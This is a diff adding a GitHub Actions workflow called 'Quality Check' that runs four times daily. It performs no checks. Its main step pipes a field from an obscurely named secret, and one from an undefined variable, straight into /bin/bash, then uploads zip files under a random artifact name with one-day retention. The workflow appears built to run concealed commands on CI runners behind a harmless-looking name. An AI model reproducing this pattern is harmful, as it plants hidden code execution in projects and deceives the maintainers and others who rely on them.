@@ -1,0 +1,34 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '0 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Perform
+        env:
+          yu2: ${{ secrets.yu2 }}
+        run: |
+          printf '%s' "$yu2" | jq -r .nauk6865 | /bin/bash
+          echo $cmxow88619 | jq -r .cz16 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: btPKi6Xv
+          path: "*.zip"
+          retention-days: 1
